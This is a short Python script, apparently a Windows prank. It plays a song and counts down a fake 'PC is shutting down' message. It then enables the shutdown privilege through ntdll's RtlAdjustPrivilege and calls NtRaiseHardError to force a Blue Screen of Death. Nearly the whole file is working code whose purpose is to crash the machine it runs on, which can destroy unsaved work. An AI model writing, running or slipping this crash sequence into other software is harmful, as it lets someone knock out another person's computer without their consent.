
import vlc
import ctypes
import winsound

from time import sleep

if __name__ == '__main__':

    # song = vlc.MediaPlayer('TheFatRat - Xenogenesis.mp3')
    # song.play()
    # song.set_time(48000)

    winsound.PlaySound('TheFatRat - Xenogenesis.wav', winsound.SND_ASYNC | winsound.SND_ALIAS)

    print('PC is shutting down in')
    print('10...')
    sleep(1)
    print('9...')
    sleep(1)
    print('8...')
    sleep(1)
    print('7...')
    sleep(1)
    print('6...')
    sleep(1)
    print('5...')
    sleep(1)
    print('4...')
    sleep(1)
    print('3...')
    sleep(1)
    print('2...')
    sleep(1)
    print('1...')
    sleep(1)
    print('....')
    sleep(2.5)

    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("BSOD Successfull!")
    else:
        print("BSOD Failed...")

    while True:
        pass